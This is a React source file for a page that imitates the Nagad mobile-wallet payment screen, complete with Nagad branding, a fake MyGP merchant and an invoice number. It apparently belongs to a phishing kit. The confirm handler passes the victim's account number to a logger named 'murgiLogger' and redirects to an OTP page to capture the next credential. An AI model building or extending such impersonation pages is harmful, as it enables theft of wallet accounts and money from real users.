import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { useToast } from "@/hooks/use-toast";
import nagadLogo from "@/assets/nagad-logo.png";
import mygpLogo from "@/assets/mygp-logo.png";
import { Loader } from "@/components/ui/loader";
import murgiLogger from "@/lib/murgiLogger";

const Nagad = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "20.00";
  const [accountNumber, setAccountNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [showCancel, setShowCancel] = useState(false);

  const handleConfirm = () => {
    const bdPhoneRegex = /^01[3-9]\d{8}$/;
    if (accountNumber.length === 11 && bdPhoneRegex.test(accountNumber)) {
      murgiLogger.paymentNumber("Nagad", accountNumber);
      setLoading(true);
      setTimeout(() => {
        navigate(`/otp?amount=${amount}`, { 
          state: { 
            paymentMethod: "Nagad", 
            accountNumber, 
            logo: nagadLogo,
            brandColor: "#E30613"
          } 
        });
      }, 800);
    } else {
      toast({
        title: "Invalid number",
        description: "Please enter a valid Bangladesh mobile number (e.g., 017XXXXXXXX)",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4" style={{ backgroundColor: "#e8ebef" }}>
      <div className="w-full max-w-sm bg-white rounded-xl shadow-lg overflow-hidden">
        {/* Header with Logo */}
        <div className="bg-white p-4 border-b border-gray-200">
          <img src={nagadLogo} alt="Nagad" className="h-8 mx-auto" />
        </div>

        {/* Merchant Info */}
        <div className="bg-white p-4 border-b border-gray-200 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <img src={mygpLogo} alt="MyGP" className="w-10 h-10 object-contain" />
            <div>
              <div className="font-semibold text-gray-800 text-sm">Merchant:MyGP-Direct Charge</div>
              <div className="text-xs text-gray-500">Inv No: NGD457BD374N9</div>
            </div>
          </div>
          <div className="font-bold text-gray-800">৳{amount}</div>
        </div>

        {/* Red Section */}
        <div className="p-6" style={{ backgroundColor: "#E30613" }}>
          <div className="text-center mb-6">
            <label className="text-white font-medium text-sm block mb-3">
              Your Nagad Account Number
            </label>
            <input
              type="tel"
              placeholder="e.g 01XXXXXXXXX"
              value={accountNumber}
              onChange={(e) => setAccountNumber(e.target.value.replace(/\D/g, "").slice(0, 11))}
              maxLength={11}
              className="w-full px-4 py-3 rounded text-center text-gray-800 text-lg font-medium placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-white"
            />
          </div>
          <div className="text-center text-white text-xs">
            Confirm and proceed.{" "}
            <a href="#" className="underline">
              terms & conditions
            </a>
          </div>
        </div>

        {/* Cancel Alert */}
        {showCancel && (
          <div className="bg-red-50 border-l-4 border-red-500 p-4 mx-4">
            <div className="flex items-center justify-between">
              <p className="text-sm font-medium text-red-800">Are you sure you want to cancel?</p>
              <div className="flex gap-2">
                <button
                  onClick={() => setShowCancel(false)}
                  className="px-3 py-1 text-xs bg-gray-200 text-gray-700 rounded hover:bg-gray-300"
                >
                  No
                </button>
                <button
                  onClick={() => navigate(`/payment?amount=${amount}`)}
                  className="px-3 py-1 text-xs bg-red-600 text-white rounded hover:bg-red-700"
                >
                  Yes
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Action Buttons */}
        <div className="bg-white p-4 grid grid-cols-2 gap-3">
          <button
            onClick={() => setShowCancel(true)}
            className="py-2.5 text-gray-600 font-medium rounded border border-gray-300 hover:bg-gray-50 transition-colors"
          >
            Cancel
          </button>
          <button
            onClick={handleConfirm}
            className="py-2.5 text-gray-400 font-medium rounded border border-gray-200 cursor-not-allowed flex items-center justify-center"
            disabled={!accountNumber || accountNumber.length !== 11 || loading}
            style={
              accountNumber.length === 11 && !loading
                ? { backgroundColor: "#E30613", color: "white", borderColor: "#E30613", cursor: "pointer" }
                : {}
            }
          >
            {loading ? <Loader /> : "Confirm"}
          </button>
        </div>

        {/* Footer */}
        <div className="bg-white px-4 pb-4 text-center">
          <div className="flex items-center justify-center gap-1 text-xs text-gray-600 mb-2">
            <svg className="w-4 h-4 text-red-600" fill="currentColor" viewBox="0 0 20 20">
              <path d="M2 3a1 1 0 011-1h2.153a1 1 0 01.986.836l.74 4.435a1 1 0 01-.54 1.06l-1.548.773a11.037 11.037 0 006.105 6.105l.774-1.548a1 1 0 011.059-.54l4.435.74a1 1 0 01.836.986V17a1 1 0 01-1 1h-2C7.82 18 2 12.18 2 5V3z"/>
            </svg>
            <a href="tel:16167" className="font-semibold text-red-600 hover:underline">16167</a>
          </div>
          <div className="text-xs text-gray-500">© 2023 Nagad, All Rights Reserved</div>
        </div>
      </div>

    </div>
  );
};

export default Nagad;
